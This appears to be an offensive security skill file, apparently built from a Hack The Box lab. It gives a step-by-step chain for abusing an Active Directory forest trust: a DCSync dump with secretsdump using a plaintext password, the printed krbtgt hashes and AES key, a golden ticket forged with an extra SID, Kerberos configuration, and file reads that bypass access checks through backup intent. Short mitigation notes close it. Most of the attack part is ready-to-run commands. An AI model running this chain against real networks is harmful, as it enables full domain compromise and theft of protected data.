---
name: cross-forest-sidhistory-backup-intent
description: After DCSync of a source domain, forge an inter-realm golden ticket carrying a target-forest privileged group SID, request the target CIFS service ticket, and read protected files with FILE_OPEN_FOR_BACKUP_INTENT. Use for authorized forest-trust assessments and to validate Backup Operators semantics.
domain: cybersecurity
subdomain: active-directory
tags:
- active-directory
- forest-trust
- golden-ticket
- sid-history
- dcsync
- backup-operators
- smb
- impacket
version: '1.0'
author: bugbounty
license: Apache-2.0
nist_csf:
- ID.RA-01
- PR.AA-05
mitre_attack:
- T1558.001
- T1003.003
- T1134.005
---
# Cross-Forest SID History + Backup Intent

> **Legal Notice:** Authorized security testing only. Backup intent and
> golden-ticket techniques are highly privileged; use only in an authorized lab
> or engagement.

## Overview

A bidirectional forest trust can turn source-domain DCSync into target-forest
access when a target group with local backup rights is added as an extra SID.
The target group may not grant interactive admin or service execution, but it
can grant `SeBackupPrivilege`. That privilege is only effective when the SMB
create requests `FILE_OPEN_FOR_BACKUP_INTENT`.

## Prerequisites

- Domain Admin or DCSync rights in the source domain
- Source `krbtgt` keys (NT and AES256)
- Target forest SID and target privileged group RID
- Target group has `Backup Operators`/`SeBackupPrivilege` on the target DC
- Network reachability to both KDCs and target SMB
- Impacket `secretsdump.py`, `ticketer.py`, `kvno`

## 1. DCSync the source domain

```bash
secretsdump.py \
  -dc-ip 172.16.20.2 \
  -just-dc-user krbtgt \
  'DARKZERO.EXT/celia:babygurl13@172.16.20.2'
```

Collect source domain SID, `krbtgt` NT hash, and AES256 key:

```text
Domain SID: S-1-5-21-2850783758-1231244658-2051857529
krbtgt NT:  8beaf5f950fefe79f608390a806d29a7
krbtgt AES: 8daff56ad74584679edcbf648a690e3a6cd1e03b8703fb890c9b603cc3a80fe6
```

Full source-domain dump:

```bash
secretsdump.py -dc-ip 172.16.20.2 -just-dc \
  'DARKZERO.EXT/celia:babygurl13@172.16.20.2' > ext_ntds.txt
```

## 2. Identify the target extra SID

```text
Target domain SID: S-1-5-21-2899195410-1848524783-1547768515
InfrastructureAdministrators RID: 1603
Extra SID: S-1-5-21-2899195410-1848524783-1547768515-1603
```

Confirm the target group is in `Backup Operators`.

## 3. Forge the source-domain golden ticket

```bash
ticketer.py \
  -aesKey 8daff56ad74584679edcbf648a690e3a6cd1e03b8703fb890c9b603cc3a80fe6 \
  -domain-sid S-1-5-21-2850783758-1231244658-2051857529 \
  -domain DARKZERO.EXT \
  -extra-sid S-1-5-21-2899195410-1848524783-1547768515-1603 \
  Administrator
```

This writes `Administrator.ccache` for `Administrator@DARKZERO.EXT`.

## 4. Pin both realms in krb5.conf

```ini
[libdefaults]
 default_realm = DARKZERO.EXT
 dns_lookup_kdc = false
 dns_lookup_realm = false
 rdns = false
 forwardable = true

[realms]
 DARKZERO.EXT = { kdc = 172.16.20.2 }
 DARKZERO.HTB = { kdc = 172.16.20.1 }

[domain_realm]
 .darkzero.ext = DARKZERO.EXT
 darkzero.ext = DARKZERO.EXT
 .darkzero.htb = DARKZERO.HTB
 darkzero.htb = DARKZERO.HTB
```

## 5. Request the target-realm CIFS ticket

Correct principals are target-realm:

```text
krbtgt/DARKZERO.HTB@DARKZERO.HTB
cifs/dc01.darkzero.htb@DARKZERO.HTB
```

`@DARKZERO.EXT` service-ticket variants are not the target service. They may
resolve via referral but are the wrong realm.

```bash
export KRB5_CONFIG=/tmp/krb5_cross.conf
export KRB5CCNAME=/tmp/Administrator.ccache

kvno cifs/dc01.darkzero.htb@DARKZERO.HTB
kvno krbtgt/DARKZERO.HTB@DARKZERO.HTB
```

`kvno` only reports the KDC’s KVNO; there is no global “set KVNO” flag. If a
cached ticket has the wrong KVNO, destroy the cache and request a fresh ticket.

## 6. Read with backup intent

The crucial detail: `SeBackupPrivilege` does not bypass the DACL just by being
present in the token. The client must signal backup intent in the SMB create.

Use:

```text
FILE_NON_DIRECTORY_FILE       0x00000040
FILE_OPEN_FOR_BACKUP_INTENT   0x00004000
```

Tree connect alone cannot carry this semantic. A normal `smbclient` open is
access-checked and fails.

`scripts/backup_intent_read.py` reads a path from a target share with the flag.

```bash
python3 scripts/backup_intent_read.py \
  --host dc01.darkzero.htb \
  --realm darkzero.ext \
  --kdc DC02.darkzero.ext \
  --share C$ \
  --path 'Users\Administrator\Desktop\root.txt' \
  --ccache /tmp/Administrator.ccache
```

## Validation

- `C$` may list but normal read/exec still fails; that is expected for
  Backup Operators.
- The backup-intent open must succeed on the protected file.
- If the open still fails at tree connect, the issue is share ACL or
  reachability, not file DACL; backup intent does not bypass share ACL.

## Mitigations

- Do not add foreign-forest groups to `Backup Operators`.
- Enforce SID filtering/quarantine for forest trusts and monitor unusual
  inter-realm tickets.
- Limit `SeBackupPrivilege` to dedicated backup service identities.
- Monitor `SeBackupPrivilege` use and backup-intent opens of protected files.
- Rotate `krbtgt` and trust keys after suspected compromise; invalidate
  forged tickets.
- Do not expose writable or controllable OUs to CI/service accounts.
